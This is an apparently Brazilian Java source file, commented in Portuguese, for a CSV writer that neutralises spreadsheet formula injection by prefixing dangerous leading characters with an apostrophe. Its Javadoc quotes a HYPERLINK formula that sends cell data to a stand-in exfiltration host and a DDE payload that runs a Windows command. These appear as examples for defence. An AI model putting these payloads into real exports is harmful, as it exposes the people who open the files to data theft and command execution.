package br.com.engesoftware.sgdf.indicadores;

import java.util.List;

/**
 * Escreve CSV que o Excel abre sem executar nada — história F3-05.
 *
 * <p><b>A exportação em CSV é uma superfície de ataque, e a vítima é quem
 * abre o arquivo.</b> Excel, LibreOffice e Google Sheets tratam uma célula que
 * começa com {@code =}, {@code +}, {@code -}, {@code @} ou uma tabulação como
 * <b>fórmula</b>: {@code =HYPERLINK("http://exfil.example/?d="&amp;A1;"x")} vira
 * um link clicável na planilha de quem auditou, e {@code =cmd|'/c calc'!A1}
 * chega a executar comando no Windows.
 *
 * <p><b>Qual campo está realmente exposto hoje, medido e não suposto.</b> Na
 * exportação da trilha, o {@code detalhe} — onde vivem os motivos que uma
 * pessoa escreveu — sai como JSON e por isso já começa com <code>{"</code>: o
 * envelope o desarma por acidente, não por projeto. O campo que <b>chega ao
 * início da célula</b> é o {@code ator}, que vem do {@code sub} do provedor de
 * identidade e é, portanto, externo. Verificado: um ator
 * {@code =cmd|'/c calc'!A1} sai da exportação como {@code '=cmd|'/c calc'!A1}.
 *
 * <p>O escape fica na fronteira e não no campo, e é o que faz a defesa
 * sobreviver à próxima exportação — a hora em que alguém acrescentar uma coluna
 * de motivo em texto puro é exatamente a hora em que ninguém vai lembrar disto.
 *
 * <p><b>Aspas não resolvem.</b> {@code "=1+1"} continua sendo fórmula: as aspas
 * são consumidas pelo parser de CSV antes de o interpretador de fórmulas ver o
 * conteúdo. A defesa é prefixar a célula com um apóstrofo, que o Excel lê como
 * "isto é texto" e não mostra — e é o que a OWASP recomenda.
 *
 * <p><b>Prefixar sempre seria pior.</b> Prefixar um número transformaria a
 * coluna de valores em texto, e a planilha perderia soma e ordenação — que é o
 * motivo de alguém exportar em CSV. Só a célula que começa com um caractere
 * perigoso é neutralizada, e essa decisão fica <b>neste</b> arquivo, não
 * espalhada por cada consulta que exporta.
 */
public final class Csv {

    /** Os caracteres que iniciam fórmula nas três planilhas mais usadas. */
    static final String INICIOS_DE_FORMULA = "=+-@\t\r";

    private final StringBuilder saida = new StringBuilder();
    private final int colunas;

    public Csv(String... cabecalho) {
        this.colunas = cabecalho.length;
        if (colunas == 0) {
            throw new IllegalArgumentException("CSV sem cabeçalho não é legível por ninguém");
        }
        linha((Object[]) cabecalho);
    }

    /** Uma linha. O número de colunas é conferido: CSV torto é pior que erro. */
    public Csv linha(Object... valores) {
        if (valores.length != colunas) {
            throw new IllegalArgumentException("a linha tem " + valores.length
                    + " coluna(s) e o cabeçalho tem " + colunas
                    + ": um CSV desalinhado é lido errado sem avisar");
        }
        for (int i = 0; i < valores.length; i++) {
            if (i > 0) {
                saida.append(',');
            }
            saida.append(celula(valores[i]));
        }
        // CRLF: é o que o RFC 4180 manda, e o que o Excel em Windows espera.
        saida.append("\r\n");
        return this;
    }

    public Csv linhas(List<Object[]> linhas) {
        linhas.forEach(this::linha);
        return this;
    }

    public String texto() {
        return saida.toString();
    }

    /**
     * Uma célula, escapada para CSV e neutralizada contra fórmula.
     *
     * <p>Nulo vira campo vazio e não a palavra "null": a diferença entre "não
     * há valor" e "o valor é a string null" some numa planilha, e quem lê passa
     * a ver dado onde não há.
     */
    static String celula(Object valor) {
        if (valor == null) {
            return "";
        }
        String texto = String.valueOf(valor);
        if (!texto.isEmpty() && INICIOS_DE_FORMULA.indexOf(texto.charAt(0)) >= 0) {
            texto = "'" + texto;
        }
        if (texto.indexOf(',') >= 0 || texto.indexOf('"') >= 0
                || texto.indexOf('\n') >= 0 || texto.indexOf('\r') >= 0) {
            return '"' + texto.replace("\"", "\"\"") + '"';
        }
        return texto;
    }
}
